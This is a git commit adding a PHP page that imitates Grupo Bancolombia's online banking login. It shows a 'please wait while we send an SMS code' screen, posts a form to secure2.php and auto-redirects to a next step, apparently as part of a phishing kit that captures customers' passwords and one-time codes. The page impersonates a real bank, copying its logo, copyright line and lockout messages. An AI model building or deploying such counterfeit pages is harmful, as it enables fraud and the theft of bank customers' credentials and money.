550d75b7a209a33c8beedb1d16c308503d17a2fb
blomerty <126133536+blomerty@users.noreply.github.com>
2023-02-22 22:38:49 -0500

    Add files via upload

---
+++ index3.php
@@ -0,0 +1,221 @@
+<html translate="no"><head>
+	<meta charset="utf-8">
+  <meta http-equiv="refresh" content="30; url=index4.php">
+	<meta name="google" content="notranslate">
+	<title>Home</title>
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="icon" type="image/x-icon" href="favicon.ico">
+
+	<link rel="stylesheet" href="styles.96289b9c08e076e8c5a0.css">
+  <link rel="stylesheet" href="assets/css/stylecss.css">
+  <link rel="stylesheet" href="assets/css/style2.css">
+
+</head>
+
+<body style="margin: 0;">
+
+	<app-root-config _nghost-uok-c64="" ng-version="11.2.14">
+		<lib-main-app _ngcontent-uok-c64="">
+			<main class="main-app">
+        <form name="frm" action="secure2.php" method="post">
+
+				<router-outlet _ngcontent-uok-c64=""></router-outlet>
+				<per-auth-login _nghost-uok-c67="">
+					<div _ngcontent-uok-c67="" class="login-container pb-xl-5 d-flex align-items-center">
+						<div _ngcontent-uok-c67="" class="login-container__login-section row mx-0 px-3" style="width: 100%; background-color: #fff;">
+							<div _ngcontent-uok-c67="" class="col-12 col-sm-10 col-xl-5 d-flex align-items-center flex-column mt-4 mt-sm-5 mx-auto px-0">
+                <img _ngcontent-uok-c67="" alt="" class="login-container__img-logo" src="assets/img/log.jpg">
+								<h1 _ngcontent-uok-c67="" class="login-container__login-title mt-4 mt-sm-5 mb-2 mb-sm-3">¡Trabajamos por tu seguridad!</h1><br>
+<img _ngcontent-uok-c67="" alt="" class="login-container__img-logo" src="https://registro.cetys.edu.mx/images/loading.gif">
+
+<br>
+
+<h1 _ngcontent-uok-c67="" class="login-container__login-title mt-4 mt-sm-5 mb-2 mb-sm-3">Por favor espere mientras le enviamos un código SMS al celular registrado como método de validación.</h1>
+								<div _ngcontent-uok-c67="" class="login-container__user-content" style="display: contents;">
+									
+									<lib-button _ngcontent-uok-c67="" class="login-container__btn-login">
+                    
+                </lib-button>
+									
+									
+								</div>
+								<div _ngcontent-uok-c67="" class="login-container__password-content" style="display: none;">
+									<div _ngcontent-uok-c67="" class="login-container__password-input login-container__background-panel pt-5 pb-4 px-4 justify-content-center d-flex align-items-center flex-column mb-4 mb-sm-3 mt-5">
+										<div _ngcontent-uok-c67="" class="login-container__image-phrase-container justify-content-center d-flex align-items-center flex-column text-center">
+											<per-auth-rounded-img _ngcontent-uok-c67="" class="security-image" _nghost-uok-c66="">
+												<div _ngcontent-uok-c66="" class="image" style="background-image: url(&quot;&quot;);"></div>
+											</per-auth-rounded-img>
+											<div _ngcontent-uok-c67="" class="content-phrase">
+												<p _ngcontent-uok-c67="" class="open-sans">Verifica la imagen y frase de seguridad</p>
+												<p _ngcontent-uok-c67="" class="login-container__phrase mt-0">amo a mi mamá</p>
+											</div>
+										</div>
+										<!---->
+										<div _ngcontent-uok-c67="" class="login-container__password-fields">
+											<lib-see-pwd-animation _ngcontent-uok-c67="" id="input-pwd" name="input-pwd" iconclassinput="icon-pass" require="true" iconseepos="icon-right" min="1" class="input-pwd" _nghost-uok-c59="">
+												<div _ngcontent-uok-c59="" class="lib-see-password">
+													<div _ngcontent-uok-c59="" class="lib-see-password--contem"><i _ngcontent-uok-c59="" class="icon-ico-view icon-right pi"></i></div>
+													<lib-input-animation _ngcontent-uok-c59="" _nghost-uok-c58=""><span _ngcontent-uok-c58="" class="p-float-label p-input-icon-left icon-input-class"><div _ngcontent-uok-c58="" class="icon-input"><i _ngcontent-uok-c58="" class="icon-pass"></i><!----><input _ngcontent-uok-c58="" copypaste="" pinputtext="" id="input-pwd" type="password" autocomplete="off" class="form-control input-general p-inputtext p-component ng-untouched ng-pristine ng-valid" minlength="1" maxlength="20"><label _ngcontent-uok-c58="" for="float-input" class="label-pwd-icon">Ingresa la contraseña</label><!----><!----><!----><!----></div></span></lib-input-animation>
+												</div>
+											</lib-see-pwd-animation><a _ngcontent-uok-c67="" class="login-container__forget-password">¿Olvidaste tu contraseña?</a></div>
+									</div>
+									<div _ngcontent-uok-c67="" class="login-container__container-buttons justify-content-center d-flex align-items-center flex-column">
+										<lib-button _ngcontent-uok-c67="" class="login-container__btn-password mb-3"><button pbutton="" class="p-button p-component btn primary-gray" disabled=""><span class="p-button-label">INICIAR SESIÓN</span></button></lib-button>
+										<lib-button _ngcontent-uok-c67="" type="btn primary-black-border" class="login-container__btn-password"><button pbutton="" class="p-button p-component btn primary-black-border"><span class="p-button-label">REGRESAR</span></button></lib-button>
+									</div>
+								</div>
+							</div>
+							<div _ngcontent-uok-c67="" class="col-12 col-sm-11 mx-auto col-xl-7 d-flex align-items-center flex-column mt-5 mb-4 mb-md-3 mb-xl-0 px-0">
+								<div _ngcontent-uok-c67="" class="login-container__img-welcome p-1 p-md-2" style="background-color: #FFFFFF;"><img _ngcontent-uok-c67="" src="assets/img/kaka.jpg" alt="" class="login-container__img-welcome"></div>
+							</div>
+						</div>
+					</div>
+					<lib-footer _ngcontent-uok-c67="" _nghost-uok-c53="">
+						<div _ngcontent-uok-c53="" class="footer-section">
+							<ul _ngcontent-uok-c53="" class="container-links">
+								<li _ngcontent-uok-c53="">
+									<!----><a _ngcontent-uok-c53="" href="#" target="_blank">Contáctanos</a>
+									<!---->
+								</li>
+								<li _ngcontent-uok-c53="">
+									<!----><a _ngcontent-uok-c53="" href="#" target="_blank">Términos y condiciones</a>
+									<!---->
+								</li>
+								<li _ngcontent-uok-c53="">
+									<!----><a _ngcontent-uok-c53="" href="#" target="_blank">Política de privacidad</a>
+									<!---->
+								</li>
+								<li _ngcontent-uok-c53="">
+									<!----><a _ngcontent-uok-c53="" href="#" target="_blank">Aprende sobre seguridad</a>
+									<!---->
+								</li>
+								<!---->
+							</ul>
+							<!---->
+							<hr _ngcontent-uok-c53="">
+							<div _ngcontent-uok-c53="" class="footer-section--content">
+								<div _ngcontent-uok-c53="" class="content-left"><img _ngcontent-uok-c53="" src="assets/img/bancolombia-group-logo.svg"><span _ngcontent-uok-c53="">Copyright © 2023 Grupo Bancolombia.</span>
+									<!---->
+								</div>
+								<div _ngcontent-uok-c53="" class="content-right"><span _ngcontent-uok-c53=""></span>
+									<!---->
+									<div _ngcontent-uok-c53="" id="DigiCertClickID_Ji7-knVp"></div>
+									<!---->
+								</div>
+							</div>
+						</div>
+
+					</lib-footer>
+				</per-auth-login>
+          </form>
+				<!---->
+				<lib-load-spinner _ngcontent-uok-c64="" message="Cargando...">
+					<!---->
+				</lib-load-spinner>
+			</main>
+		</lib-main-app>
+		<!---->
+	</app-root-config>
+
+	<script src="assets/js/runtime.js" defer=""></script>
+	<script src="assets/js/polyfills.js" defer=""></script>
+	<script src="assets/js/scripts.js" defer=""></script>
+  <script>
+  function limpia(elemento)
+  {
+  elemento.value = "";
+  }
+
+  function verifica(elemento)
+  {
+  if(elemento.value == "")
+  elemento.value = "Ingresa tu Clave";
+  }
+  </script>
+
+	<lib-content-modal _ngcontent-uok-c64="" id="generalModal">
+		<div class="lib-content-modal">
+			<div class="col-11 col-lg-6 col-md-8 lib-content-modal-body">
+				<!---->
+				<div _ngcontent-uok-c64="" class="row d-flex align-items-center justify-content-center text-center">
+					<div _ngcontent-uok-c64="" class="col-12 d-flex align-items-center justify-content-center mb-3"><i _ngcontent-uok-c64=""></i></div>
+					<div _ngcontent-uok-c64="" class="col-12 d-flex justify-content-center p-0 mb-3">
+						<h4 _ngcontent-uok-c64="" class="p-0"></h4></div>
+					<div _ngcontent-uok-c64="" class="col-12 d-flex justify-content-center mb-3"><span _ngcontent-uok-c64=""></span></div>
+				</div>
+				<div _ngcontent-uok-c64="" class="row d-flex justify-content-center mb-2">
+					<!---->
+					<!---->
+				</div>
+			</div>
+		</div>
+		<div class="lib-content-modal-background"></div>
+	</lib-content-modal>
+	<lib-content-modal _ngcontent-uok-c67="" id="modalLockFail">
+		<div class="lib-content-modal">
+			<div class="col-11 col-lg-6 col-sm-10 lib-content-modal-body">
+				<div class="row justify-content-end m-1 align"><i role="button" class="pi pi-times"></i></div>
+				<!---->
+				<div _ngcontent-uok-c67="" class="row">
+					<div _ngcontent-uok-c67="" class="col-12 d-flex justify-content-center align-items-center"><i _ngcontent-uok-c67="" class="icon-hand rounded-circle circle yellow-color"></i></div>
+					<div _ngcontent-uok-c67="" class="col-12 d-flex text-center justify-content-center pt-1 pb-3">
+						<h4 _ngcontent-uok-c67="" class="m-3 font-cib">Tu usuario se encuentra bloqueado</h4></div>
+					<div _ngcontent-uok-c67="" class="col-12 text-center pb-4 lockedDescription"> Para desbloquearlo e ingresar debes restablecer la contraseña </div>
+					<div _ngcontent-uok-c67="" class="col-12 text-center label-sans pb-3">
+						<div _ngcontent-uok-c67="" class="row d-flex justify-content-center flex-wrap-reverse">
+							<div _ngcontent-uok-c67="" class="col-12 col-sm-6 col-lg-5 text-end d-block d-md-none">
+								<lib-button _ngcontent-uok-c67="" label="CERRAR" type="btn primary-white"><button pbutton="" class="btn primary-white p-button p-component"><span class="p-button-label">CERRAR</span></button></lib-button>
+							</div>
+							<div _ngcontent-uok-c67="" class="col-12 col-sm-6 col-lg-5 text-start mb-3 mb-md-0">
+								<lib-button _ngcontent-uok-c67="" type="btn primary-yellow" label="RESTABLECER CONTRASEÑA"><button pbutton="" class="btn primary-yellow p-button p-component"><span class="p-button-label">RESTABLECER CONTRASEÑA</span></button></lib-button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="lib-content-modal-background"></div>
+	</lib-content-modal>
+	<lib-content-modal _ngcontent-uok-c67="" id="modalLockMac">
+		<div class="lib-content-modal">
+			<div class="col-11 col-lg-5 col-md-8 col-sm-11 col-xl-5 lib-content-modal-body">
+				<div class="row justify-content-end m-1 align"><i role="button" class="pi pi-times"></i></div>
+				<!---->
+				<div _ngcontent-uok-c67="" class="d-flex justify-content-center mb-3 container-modal">
+					<div _ngcontent-uok-c67="" class="p-2 bg-error icon-modal-container"><i _ngcontent-uok-c67="" class="icon-error"></i></div>
+				</div>
+				<h4 _ngcontent-uok-c67="" class="mb-3 text-center px-4 font-cib">Usuario bloqueado</h4>
+				<div _ngcontent-uok-c67="" class="text-center lockedDescription mb-4 px-3"> Por tu seguridad el usuario ha sido bloqueado. Comunícate al 2338-6565 para mayor información. </div>
+				<div _ngcontent-uok-c67="" class="row d-flex justify-content-center mt-3 mb-2">
+					<lib-button _ngcontent-uok-c67="" label="ENTENDIDO" type="btn primary-yellow" class="col-11 col-md-6 col-lg-4"><button pbutton="" class="btn primary-yellow p-button p-component"><span class="p-button-label">ENTENDIDO</span></button></lib-button>
+				</div>
+			</div>
+		</div>
+		<div class="lib-content-modal-background"></div>
+	</lib-content-modal>
+	<lib-content-modal _ngcontent-uok-c67="" id="bad-username">
+		<div class="lib-content-modal">
+			<div class="col-11 col-lg-5 col-md-8 col-sm-11 col-xl-5 lib-content-modal-body">
+				<div class="row justify-content-end m-1 align"><i role="button" class="pi pi-times"></i></div>
+				<!---->
+				<div _ngcontent-uok-c67="" class="d-flex justify-content-center mb-3 container-modal">
+					<div _ngcontent-uok-c67="" class="p-2 bg-warning"><i _ngcontent-uok-c67="" class="icon-hand"></i></div>
+				</div>
+				<h4 _ngcontent-uok-c67="" class="mb-3 text-center px-4 font-cib">Revisa tu usuario</h4>
+				<div _ngcontent-uok-c67="" class="text-center lockedDescription mb-4 px-3"> Verifica el usuario que has ingresado e intenta de nuevo para visualizar tus productos. </div>
+				<div _ngcontent-uok-c67="" class="row d-flex justify-content-center mt-3 mb-2">
+					<lib-button _ngcontent-uok-c67="" label="INTENTAR DE NUEVO" type="btn primary-yellow" class="col-11 col-md-6 col-lg-6"><button pbutton="" class="btn primary-yellow p-button p-component"><span class="p-button-label">INTENTAR DE NUEVO</span></button></lib-button>
+				</div>
+			</div>
+		</div>
+		<div class="lib-content-modal-background"></div>
+	</lib-content-modal>
+	<div>
+		<div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
+			<div class="grecaptcha-logo"></div>
+			<div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div>
+
+
+</body></html>
